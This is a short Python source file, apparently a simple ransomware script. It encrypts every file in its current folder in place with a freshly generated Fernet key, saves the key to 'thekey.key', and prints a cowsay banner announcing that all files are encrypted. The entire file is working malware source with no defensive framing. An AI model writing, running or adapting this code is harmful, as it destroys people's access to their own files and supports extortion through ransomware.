import os
import cowsay
from cryptography.fernet import Fernet

files=[]
# Open all files in the current folder except this
for file in os.listdir():
    if file == "ransome.py" or file == "thekey.key" or file =="desktop.ini" or file=="decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)

#print(files)

key = Fernet.generate_key()
#print(key)

with open("thekey.key" ,"wb") as thekey:
    thekey.write(key)
    
for file in files:
    with open(file,"rb") as thefile:
        contents=thefile.read()
    content_encrypted=Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(content_encrypted)

print(cowsay.get_output_string("ghostbusters","All your files are encrypted"))
#print("Ooppsss! \tsorry \tbut \tall \tyour \tfiles \tare \tencrypted")
